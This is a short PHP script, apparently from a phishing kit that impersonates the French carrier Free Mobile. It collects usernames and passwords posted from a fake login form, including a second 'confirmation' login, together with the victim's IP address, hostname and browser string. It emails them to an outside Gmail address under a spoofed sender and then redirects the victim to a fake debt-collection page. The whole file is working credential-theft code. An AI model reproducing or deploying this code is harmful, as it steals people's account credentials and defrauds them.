<?

$ip = getenv("REMOTE_ADDR");
$rx = "
-------------------+ FreeMobile 2014 +-------------------
User: ".$_POST['comid']."
Pass: ".$_POST['compw']."
-------------------+ confirmation login +-------------------
User: ".$_POST['comid2']."
Pass: ".$_POST['compw2']."
--------------------------------------
IP      : ".$ip."
HOST    : ".gethostbyaddr($ip)."
BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
-------------------+ FreeMobile 2014 +-------------------

";

$xmail = "dunewres@gmail.com";

mail($xmail,"Free Mobile|".$ip,$rx,"From: Log<ghaz@mobile.fr>");
echo('<META http-equiv="refresh" content="0;URL=freemobile/page.html?page=recouvrement&impaye=4ad939f0d4548dfeab228bf7e7528eea597404c06ea733402847fed7cf6f3ccf">');
?>